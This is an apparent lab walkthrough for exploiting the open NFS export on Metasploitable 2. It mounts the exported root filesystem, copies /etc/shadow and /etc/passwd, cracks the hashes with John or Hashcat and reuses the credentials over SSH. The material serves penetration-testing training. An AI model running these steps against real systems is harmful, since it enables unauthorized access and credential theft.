
#### 🔎 Detection

```bash
showmount -e 192.168.56.109
```

**Result:**

```
Export list for 192.168.56.109:
/ *
```

- Entire filesystem `/` is exported.
    
- Accessible by any host (`*`).
    

---

#### 💥 Exploitation Steps

**1. Create a mount point**

```bash
sudo mkdir -p /mnt/ms2nfs
```

**Explanation:**

- `sudo` → run as root (needed under `/mnt`).
    
- `mkdir` → make a new directory.
    
- `-p` → create parent directories if missing, don’t error if it already exists.
    
- `/mnt/ms2nfs` → directory path where the NFS share will be mounted.
    

➡️ This prepares a local folder to attach the remote filesystem.

**2. Mount the export**

```bash
sudo mount -t nfs 192.168.56.109:/ /mnt/ms2nfs
ls /mnt/ms2nfs
```

➡️ Reveals full MS2 filesystem.

**3. Loot sensitive files**

```bash
cat /mnt/ms2nfs/etc/shadow
cp /mnt/ms2nfs/etc/shadow ~/ms2-shadow
cp /mnt/ms2nfs/etc/passwd ~/ms2-passwd
```

**4. Crack credentials**  
Combine password & shadow files:

```bash
unshadow ~/ms2-passwd ~/ms2-shadow > ~/ms2-unshadow
```

Crack with John:

```bash
john ~/ms2-unshadow
```

Or with Hashcat (example for SHA512crypt):

```bash
hashcat -m 1800 ~/ms2-shadow /usr/share/wordlists/rockyou.txt
```

**5. Reuse credentials**  
Once cracked (e.g., `msfadmin:msfadmin`):

- SSH into target:
    
    ```bash
    ssh msfadmin@192.168.56.109
    ```
    
- Or use Metasploit `exploit/ssh/ssh_login`.
    

---

#### ✅ Why this works

- Metasploitable 2 NFS is misconfigured to export `/` to all hosts.
    
- Allows remote read of sensitive files, including `/etc/shadow`.
    
- Enables offline cracking and credential reuse.
    

---

### Summary Attack Chain

1. **Discover exports** with `showmount -e`.
    
2. **Create mount point** (`/mnt/ms2nfs`).
    
3. **Mount `/`** locally.
    
4. **Steal `/etc/shadow` + `/etc/passwd`**.
    
5. **Crack hashes** with John/Hashcat.
    
6. **Reuse creds** (SSH / Metasploit).